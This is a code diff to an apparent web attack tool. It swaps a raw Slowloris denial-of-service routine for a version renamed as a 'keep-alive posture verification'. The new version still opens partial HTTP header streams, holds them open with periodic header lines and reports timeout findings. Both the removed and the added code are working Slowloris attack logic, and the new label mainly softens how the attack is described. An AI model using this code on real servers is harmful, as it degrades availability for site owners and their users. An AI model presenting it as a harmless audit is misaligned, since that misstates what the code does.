@@ -599,36 +599,117 @@ async def port_scan_attack(url: str, duration: int, intensity: int, target_port:
 # ── New Attack Functions ─────────────────────────────────────────────
 
 async def slowloris_attack(url: str, duration: int, intensity: int, threads: int, attack_id: str):
-    """Slowloris — opens many partial HTTP connections and keeps them alive."""
-    import socket as _sock
-    start_time = time.time()
-    host_port = re.sub(r'^https?://', '', url.strip()).split('/')[0]
+    """Keep-Alive & Header Read-Timeout Posture Verification (non-blocking asyncio)."""
+    await target_audit(url, attack_id)
+    base_url = format_url(url)
+    host_port = re.sub(r'^https?://', '', base_url.strip()).split('/')[0]
     host = host_port.split(':')[0]
-    port = int(host_port.split(':')[1]) if ':' in host_port and host_port.split(':')[1].isdigit() else (443 if url.startswith('https') else 80)
-    sockets = []
+    port = int(host_port.split(':')[1]) if ':' in host_port and host_port.split(':')[1].isdigit() else (443 if base_url.startswith('https') else 80)
+    use_ssl = base_url.startswith('https') or port == 443
+
+    # 1. Inspect HTTP Keep-Alive & Server Timeout Headers
+    try:
+        connector = aiohttp.TCPConnector(ssl=False)
+        async with aiohttp.ClientSession(connector=connector) as session:
+            t0 = time.time()
+            async with session.get(
+                base_url,
+                headers={"Connection": "keep-alive", "Keep-Alive": "timeout=300, max=1000"},
+                timeout=aiohttp.ClientTimeout(total=6)
+            ) as resp:
+                elapsed = time.time() - t0
+                metrics["response_times"].append(elapsed)
+                hdrs = {k.lower(): v for k, v in resp.headers.items()}
+                conn_val = hdrs.get("connection", "")
+                ka_val   = hdrs.get("keep-alive", "")
+                if "timeout=" not in ka_val.lower() and "close" not in conn_val.lower():
+                    await _broadcast_finding({
+                        "type": "Unbounded Keep-Alive / Missing Timeout Header",
+                        "severity": "medium",
+                        "url": base_url,
+                        "payload": "Connection: keep-alive (No Keep-Alive timeout directive)",
+                        "detail": "Server accepts persistent Keep-Alive connections without advertising an explicit timeout bound in the Keep-Alive response header.",
+                        "evidence": f"HTTP {resp.status} | Connection: {conn_val or 'default (keep-alive)'} | Keep-Alive: {ka_val or 'absent'}",
+                        "timestamp": datetime.now().isoformat(),
+                        "attack_id": attack_id,
+                        "category": "availability-posture"
+                    })
+    except Exception:
+        pass
+
+    # 2. Bounded non-blocking partial-header hold verification
+    start_time = time.time()
+    streams = []
+    max_verify_streams = min(max(threads, 1), 15)
+    finding_logged = False
+
     while time.time() - start_time < duration and metrics['attacks_running']:
-        try:
-            s = _sock.socket(_sock.AF_INET, _sock.SOCK_STREAM)
-            s.settimeout(4)
-            s.connect((host, port))
-            s.send(f'GET /?{random.randint(0,9999)} HTTP/1.1\r\nHost: {host}\r\nUser-Agent: Mozilla/5.0\r\n'.encode())
-            sockets.append(s)
-            metrics['total_requests'] += 1
-            metrics['successful_requests'] += 1
-            metrics['request_history'].append({'time': time.time(), 'status': 'open', 'response_time': 0})
-            await manager.broadcast(json.dumps({'type':'log','message':f'[Slowloris] Socket #{len(sockets)} open to {host}:{port}','level':'warning'}))
-        except Exception:
-            metrics['failed_requests'] += 1
-        # Keep sockets alive by sending partial headers
-        for s in list(sockets):
+        if len(streams) < max_verify_streams:
             try:
-                s.send(f'X-Header: {random.randint(0,999999)}\r\n'.encode())
+                t_conn = time.time()
+                reader, writer = await asyncio.wait_for(
+                    asyncio.open_connection(host, port, ssl=(ssl.create_default_context() if use_ssl else None)),
+                    timeout=3.5
+                )
+                req_line = f"GET /?verify={random.randint(1000,9999)} HTTP/1.1\r\nHost: {host}\r\nUser-Agent: CyberStrike-Audit/1.0\r\n"
+                writer.write(req_line.encode())
+                await asyncio.wait_for(writer.drain(), timeout=2.0)
+                conn_latency = time.time() - t_conn
+
+                streams.append((reader, writer, time.time()))
+                metrics['total_requests'] += 1
+                metrics['successful_requests'] += 1
+                metrics['response_times'].append(conn_latency)
+                metrics['request_history'].append({'time': time.time(), 'status': 'open', 'response_time': conn_latency})
+                await manager.broadcast(json.dumps({
+                    'type': 'log',
+                    'message': f'[Keep-Alive Audit] Stream #{len(streams)}/{max_verify_streams} held open to {host}:{port} ({conn_latency*1000:.1f} ms)',
+                    'level': 'warning'
+                }))
             except Exception:
-                sockets.remove(s)
-        await asyncio.sleep(1.0 / max(intensity, 1))
-    for s in sockets:
-        try: s.close()
-        except: pass
+                metrics['failed_requests'] += 1
+
+        # Send periodic keep-alive header line & check if server held stream > 8s without header timeout
+        active_streams = []
+        for rdr, wrt, opened_at in streams:
+            try:
+                t_ping = time.time()
+                wrt.write(f"X-KeepAlive-Check: {random.randint(10000,99999)}\r\n".encode())
+                await asyncio.wait_for(wrt.drain(), timeout=1.5)
+                ping_rt = time.time() - t_ping
+                metrics['total_requests'] += 1
+                metrics['successful_requests'] += 1
+                metrics['response_times'].append(ping_rt)
+                active_streams.append((rdr, wrt, opened_at))
+
+                held_sec = time.time() - opened_at
+                if held_sec >= 6.0 and not finding_logged:
+                    finding_logged = True
+                    await _broadcast_finding({
+                        "type": "Slow Header Read Timeout Not Enforced",
+                        "severity": "high",
+                        "url": f"{host}:{port}",
+                        "payload": "Incomplete HTTP/1.1 header stream held > 6.0s",
+                        "detail": f"Target kept {len(streams)} incomplete HTTP header streams open for {held_sec:.1f}s without enforcing a strict client_header_timeout.",
+                        "evidence": f"Host {host}:{port} accepted incremental X-KeepAlive-Check headers over {held_sec:.1f}s",
+                        "timestamp": datetime.now().isoformat(),
+                        "attack_id": attack_id,
+                        "category": "timeout-posture"
+                    })
+            except Exception:
+                try:
+                    wrt.close()
+                except Exception:
+                    pass
+        streams = active_streams
+        await asyncio.sleep(max(1.0 / max(intensity, 1), 0.35))
+
+    for _, wrt, _ in streams:
+        try:
+            wrt.close()
+        except Exception:
+            pass
+
 
 
 async def traversal_attack(url: str, duration: int, intensity: int, threads: int, attack_id: str):
@@ -1378,12 +1459,14 @@ async def run_attack_coordinator(req: AttackRequest, attack_id: str):
     # Broadcast real-time metrics periodically in the background
     async def stats_broadcaster():
         while metrics["attacks_running"]:
+            latest_rt = metrics["response_times"][-1] if metrics["response_times"] else None
             await manager.broadcast(json.dumps({
                 "type": "metrics",
                 "data": {
                     "total_requests": metrics["total_requests"],
                     "successful_requests": metrics["successful_requests"],
                     "failed_requests": metrics["failed_requests"],
+                    "response_time": latest_rt,
                     "attack_id": attack_id
                 }
             }))
